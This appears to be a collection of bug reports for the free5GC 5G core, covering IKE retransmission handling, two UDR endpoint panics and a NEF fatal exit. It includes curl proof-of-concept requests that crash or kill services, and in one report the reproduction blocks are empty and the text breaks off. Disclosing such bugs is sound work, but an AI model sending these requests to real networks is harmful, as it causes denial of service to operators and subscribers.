2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Ecoding initiator for later IKE authentication
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Parsing security association
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Received traffic selector initiator from UE
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Received traffic selector initiator from UE
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] Handle IKE_AUTH
2026-04-04T16:41:24Z [INFO][N3IWF][IKE] EAP5G MessageID : 2
2026-04-04T16:41:24Z [INFO][N3IWF][NGAP] Send Initial UE Message
2026-04-04T16:41:29Z [INFO][N3IWF][IKE] Handle IKE_AUTH          ← retransmission, same MessageID
2026-04-04T16:41:29Z [INFO][N3IWF][IKE] EAP5G MessageID : 2      ← not rejected
2026-04-04T16:41:29Z [INFO][N3IWF][NGAP] Send Uplink NAS Transport ← duplicate NAS sent to AMF
2026-04-04T16:41:34Z [INFO][N3IWF][IKE] Handle IKE_AUTH          ← retransmission again
2026-04-04T16:41:34Z [INFO][N3IWF][IKE] EAP5G MessageID : 2      ← still not rejected
2026-04-04T16:41:34Z [INFO][N3IWF][NGAP] Send Uplink NAS Transport ← another duplicate
2026-04-04T16:41:39Z [INFO][N3IWF][IKE] Handle IKE_AUTH          ← 4th time
2026-04-04T16:41:39Z [INFO][N3IWF][IKE] EAP5G MessageID : 2      ← still processed
2026-04-04T16:41:39Z [INFO][N3IWF][NGAP] Send Uplink NAS Transport ← duplicate again
```

The N3IWF processes the same IKE_AUTH message (MessageID=2) **four times** over 15 seconds, each time forwarding a duplicate NAS message to AMF. A conformant IKEv2 implementation would process it once and retransmit the cached response for subsequent duplicates.

items.title: [Bugs] UDR nudr-dr DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions panics on missing UE state
items.body:
## Bug Decription
`UDR`'s `DELETE /nudr-dr/v2/subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` path is single-request panicable.

The handler forwards attacker-controlled `ueId` and `subsId` into `RemoveAmfSubscriptionsInfoProcedure()`:

```go
subsId := c.Params.ByName("subsId")
s.Processor().RemoveAmfSubscriptionsInfoProcedure(c, subsId, ueId)
```

In the processor, a missing `ueId` only sets `pd`, but execution continues and immediately type-asserts the nil `value` from `sync.Map.Load()`:

```go
value, ok := udrSelf.UESubsCollection.Load(ueId)
if !ok {
    pd = util.ProblemDetailsNotFound("USER_NOT_FOUND")
}

UESubsData := value.(*udr_context.UESubsData)
```

That produces a runtime panic:

```text
panic: interface conversion: interface {} is nil, not *context.UESubsData
```

This is reachable with a single authenticated request against a fresh `UDR` instance; no pre-existing subscription state is required.

Code evidence:

- route exposure:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2170`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- panic root cause:
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:53`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:56`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61`

Local Docker validation on March 22, 2026 confirmed:

1. restart `udr` to clear in-memory subscription state
2. obtain a valid `nudr-dr` token
3. send one `DELETE` request with nonexistent path values such as `ueId=x`, `subsId=x`
4. `UDR` returns `500`
5. logs show a nil-interface conversion panic in `RemoveAmfSubscriptionsInfoProcedure()`

In this lab Gin recovery kept the process alive, but the endpoint is still panicable by a single request and repeatedly triggerable for DoS.

## To Reproduce
Steps to reproduce the behavior:

1. Restart `UDR` to ensure a clean in-memory state:

```bash
docker restart udr
```

2. Obtain a valid `nudr-dr` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

3. Trigger the panic with one request:

```bash
curl -i -sS -X DELETE \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```

Observed output:

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

4. Inspect `udr` logs:

```bash
docker logs --tail 40 udr 2>&1
```

Observed output includes:

```text
[ERRO][UDR][GIN] panic: interface conversion: interface {} is nil, not *context.UESubsData
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
/go/src/free5gc/NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61
[INFO][UDR][GIN] | 500 | 10.100.200.1 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |
```

## Expected Behavior
If the UE or subscription state does not exist, `UDR` should return a controlled `404` response.

Expected behavior:

- missing `ueId` state -> `404 USER_NOT_FOUND`
- no type assertion on nil interface values
- no panic and no stack trace

## Screenshots
Not applicable for this server-side issue.

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/udr:v4.2.1`
- Runtime UDR commit hash: `754d23b0`
- Validation date: March 22, 2026 local time
- Docker-based lab on the internal SBI network

### Log File
Relevant `docker logs --tail 40 udr` excerpt:

```text
2026-03-22T01:36:48.626289827Z [ERRO][UDR][DataRepo] RemoveAmfSubscriptionsInfoProcedure err:
2026-03-22T01:36:48.626445491Z [ERRO][UDR][GIN] panic: interface conversion: interface {} is nil, not *context.UESubsData
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
    /go/src/free5gc/NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61 +0x3c5
github.com/free5gc/udr/internal/sbi.(*Server).HandleRemoveAmfSubscriptionsInfo
    /go/src/free5gc/NFs/udr/internal/sbi/api_datarepository.go:2172 +0x1f2
2026-03-22T01:36:48.626463977Z [INFO][UDR][GIN] | 500 |    10.100.200.1 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |  |
```

items.title: [Bugs] UDR nudr-dr DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions panics when UE state exists but subsId is missing
items.body:
## Bug Decription
`UDR` exposes a second single-trigger panic condition on the same `amf-subscriptions` delete route after minimal state setup.

If an attacker first creates any EE subscription for a chosen `ueId`, `UDR` allocates a `UESubsCollection` entry and an `EeSubscriptionCollection` map entry:

```go
if !ok {
    udrSelf.UESubsCollection.Store(ueId, new(udr_context.UESubsData))
    value, _ = udrSelf.UESubsCollection.Load(ueId)
}
...
UESubsData.EeSubscriptionCollection[newSubscriptionID] = new(udr_context.EeSubscriptionCollection)
```

Later, `DELETE /nudr-dr/v2/subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` loads that UE state but still mishandles a missing `subsId`:

```go
_, ok = UESubsData.EeSubscriptionCollection[subsId]
if !ok {
    pd = util.ProblemDetailsNotFound("SUBSCRIPTION_NOT_FOUND")
}

if UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos == nil {
    pd = util.ProblemDetailsNotFound("AMFSUBSCRIPTION_NOT_FOUND")
}
```

When `subsId` is absent, `UESubsData.EeSubscriptionCollection[subsId]` is nil and the next line dereferences it, causing:

```text
panic: runtime error: invalid memory address or nil pointer dereference
```

This is still a single triggering request on the vulnerable endpoint; the only prerequisite is one earlier EE-subscription create to populate in-memory UE state.

Code evidence:

- precondition route and handler:
  - `NFs/udr/internal/sbi/api_datarepository.go:600`
  - `NFs/udr/internal/sbi/api_datarepository.go:602`
  - `NFs/udr/internal/sbi/api_datarepository.go:2528`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:25`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:30`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:38`
- vulnerable delete route:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- panic root cause:
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:62`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:64`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:69`

Local Docker validation on March 22, 2026 confirmed:

1. restart `udr`
2. obtain a valid `nudr-dr` token
3. create one EE subscription for `ueId=x`
4. send `DELETE /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions`
5. `UDR` returns `500`
6. logs show a nil-pointer panic at `event_amf_subscription_info_document.go:69`

In this lab Gin recovery converted the panic into `500`, but the endpoint remains repeatedly panicable and usable for DoS.

## To Reproduce
Steps to reproduce the behavior:

1. Restart `UDR`:

```bash

```

2. Obtain a valid `nudr-dr` token:

```bash

  -H 'Content-Type: application/x-www-form-urlencoded' \
```


Observed output:

```text

```

4. Trigger the panic using a nonexistent `subsId`:

items.title: [Bugs] NEF PFD notification failure fatally exits the process via bad NotifyUri
items.body:
## Bug Decription
`NEF` can be terminated when a stored `notifyUri` is unreachable and the PFD notifier handles the delivery failure with `logger.PFDManageLog.Fatal(err)`.

The crash point is in `PfdChangeNotifier.FlushNotifications()`:

```go
_, err := nc.notifier.clientPfdManagement.PFDSubscriptionsApi.NnefPFDmanagementNotify(
    context.TODO(), nc.notifier.getSubURI(id), notifyReq)
if err != nil {
    logger.PFDManageLog.Fatal(err)
}
```

A reproducible trigger path is:

1. create an AF context
2. create a PFD subscription whose `notifyUri` is unreachable
3. trigger a PFD change
4. let the notifier attempt delivery and hit `logger.Fatal`

In the validated Docker reproduction on March 20, 2026:

- the bad subscription used `http://127.0.0.1:1/notify`
- the PFD transaction request returned `201`
- immediately afterward the `nef` container exited with `exit=1`
- logs showed a fatal notification error in `pfd_notifier.go:142`

This is a process-exit DoS.

Relevant code locations:

- `NFs/nef/internal/sbi/notifier/pfd_notifier.go:135`
- `NFs/nef/internal/sbi/notifier/pfd_notifier.go:142`

## To Reproduce
Steps to reproduce the behavior:

1. Create an AF context:

```bash
curl -i -X POST 'http://10.100.200.19:8000/3gpp-traffic-influence/v1/afdos/subscriptions' \
  -H 'Content-Type: application/json' \
  --data '{"afAppId":"app-nef-dos","anyUeInd":true}'
```

Observed output:

```text
HTTP/1.1 201 Created
Location: http://nef.free5gc.org:8000/3gpp-traffic-influence/v1/afdos/subscriptions/1
```

2. Create a PFD subscription with an unreachable callback endpoint:

```bash
curl -i -X POST 'http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions' \
  -H 'Content-Type: application/json' \
  --data '{"applicationIds":["app-nef-dos"],"notifyUri":"http://127.0.0.1:1/notify"}'
```

Observed output:

```text
HTTP/1.1 201 Created
Location: http://nef.free5gc.org:8000/nnef-pfdmanagement/v1/subscriptions/1
```

3. Trigger a PFD change:

```bash
curl -i -X POST 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afdos/transactions' \
  -H 'Content-Type: application/json' \
  --data '{"pfdDatas":{"app-nef-dos":{"externalAppId":"app-nef-dos","pfds":{"pfd1":{"pfdId":"pfd1","flowDescriptions":["permit in ip from 10.68.28.39 80 to any","permit out ip from any to 10.68.28.39 80"]}}}}}'
```

4. Observe that `nef` exits:

```bash
docker inspect nef --format 'status={{.State.Status}} restart={{.RestartCount}} exit={{.State.ExitCode}}'
```

Observed output:

```text
status=exited restart=0 exit=1
```

## Expected Behavior
`NEF` should not exit when a notification target is unreachable.

Expected behavior:

- reject invalid or unreachable `notifyUri` values safely, or keep the failure local to the notification attempt
- treat notification delivery errors as ordinary request or async failures
- never call `logger.Fatal` on notification errors that can be triggered by input-derived subscription state

Not applicable.

- OS: `Ubuntu 22.04 LTS`
